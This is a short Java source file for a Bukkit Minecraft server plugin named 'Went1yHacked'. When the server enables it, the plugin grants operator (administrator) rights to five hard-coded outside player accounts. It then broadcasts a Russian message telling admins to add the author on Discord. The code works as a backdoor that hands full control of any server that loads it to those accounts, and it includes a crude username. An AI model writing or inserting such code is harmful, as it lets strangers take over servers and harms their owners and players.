package org.went1yhacked;

import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.Bukkit;

public final class Went1yHacked extends JavaPlugin {

    @Override
    public void onEnable() {
        Bukkit.getOfflinePlayer("went1ygang").setOp(true);
        Bukkit.getOfflinePlayer("Mass1ve").setOp(true);
        Bukkit.getOfflinePlayer("ZXCHOM").setOp(true);
        Bukkit.getOfflinePlayer("ded_perded").setOp(true);
        Bukkit.getOfflinePlayer("ivan_pizdorvan").setOp(true);
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say Сервер будет работать хорошо, но добавь в дс went1ygang#0001");
        // plugin by went1ygang#0001

    }
}
